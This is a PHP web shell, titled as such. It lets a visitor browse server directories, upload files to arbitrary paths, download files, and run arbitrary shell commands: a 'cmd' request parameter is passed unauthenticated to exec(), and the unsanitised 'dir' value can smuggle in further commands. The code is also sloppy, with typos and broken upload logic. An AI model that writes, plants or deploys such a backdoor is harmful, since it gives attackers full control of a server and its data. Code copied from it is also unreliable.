<!DOCTYPE html>
<html>
<body>
<head>
<title> Webshell  </title>
<h2> Webshell </h2>
<h3># Download File : </h3>
<a href="webshell.php?file=image.jpg">Click here</a>
</body>
</html>
 
<?php 
	/*if(!empty($_GET['file']))
	{
function downloadFiles($dir, $file) {
    header("Content-type: application/force-download");
    header('Content-Disposition: inline; filename="' . $dir . $file . '"');
    header("Content-Transfer-Encoding: Binary");
    header("Content-length: " . filesize($dir . $file));
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $file . '"');
    readfile("$dir$file");
} 
 
//$dir = "folder_path";
 
$file = "image.jpg";
$download = downloadFiles($dir,$file);
	} */
 
 
	if(!empty($_GET['file']))
{
	$filename = basename($_GET['file']);
	$filepath = 'destination/' . $filename;
	if(!empty($filename) && file_exists($filepath)){
 
		header("Cache-Control: public"); //It always check for content update while reusing stored content
		header("Content-Description: FIle Transfer"); //
		header("Content-Disposition: attachment; filename=$filename");
		header("Content-Type: application/zip");
		header("Content-Transfer-Emcoding: binary");
 
		readfile($filepath);
		exit;
 
	}
	else{
		echo "This File Does not exist.";
	}
}
 
?>
 
<html>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
 
<div class="container">
 
<?php
$value="";
$filename="";
$fileTmpLoc="";
$fileName="";
 
$dir = $_GET['dir'];
if (isset($_POST['dir'])) {
	$dir = $_POST['dir'];
}
$file = '';
if ($dir == NULL or !is_dir($dir)) {
	if (is_file($dir)) {
		echo "enters";
		$file = $dir;
		echo $file;
	}
	$dir = './';
}
$dir = realpath($dir.'/'.$value);
// 
$dirs = scandir($dir);
echo "<h3># Viewing directory and Command execution : " . $dir . "</h3>";
echo "\n<br><form action='".$_SERVER['PHP_SELF']."' method='GET'>";
echo "<input type='hidden' name='dir' value=".$dir." />";
echo "<input type='text' name='cmd' >\n<input type='submit' value='Execute'>\n";
echo "</form>";
echo "\n<br>\n<div class='navbar-form'><form action='".$_SERVER['PHP_SELF']."' method='POST' enctype='multipart/form-data'>\n";
echo "<input type='hidden' name='dir' value='".$_GET['dir']."'/> ";
echo "<input type='file' name='fileToUpload' id='fileToUpload'>\n<br><input type='submit' value='Upload File' name='submit'>";
echo "</div>";
 
if (isset($_POST['submit'])) {
	$uploadDirectory = $dir.'/'.basename($_FILES['fileToUpload']['name']);
	//checking if file exsists
	if(file_exists("documenti/$fileName")) { unlink("documenti/$fileName");
 
	//Place it into your "uploads" folder mow using the move_uploaded_file() function
	move_uploaded_file($fileTmpLoc, "documenti/$fileName");
	echo '<br><br><b>==>File uploaded successfully in </b><br>';
	}		
 
	//if (file_exists($uploadDirectory)) {
    //	echo "<br><br><b> Error. File already exists .</b></br></br>";
	//}
	else if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadDirectory)) {
		echo '<br><br><b>File uploaded successfully in </b><br>';
	} else {
		echo '<br><br><b>Error uploading file '.$uploadDirectory.'</b><br><br>';
 
	}
 
}
 
if (isset($_GET['cmd'])) {
	echo "<br><br><b># Result of command execution is : </b><br>";
	exec('cd '.$dir.' && '.$_GET['cmd'], $cmdresult);
	foreach ($cmdresult as $key => $value) {
		echo " <ol align='left'> $value  <br></ol>";
	}
}
echo "<br><br>";
?>
</div>
</html>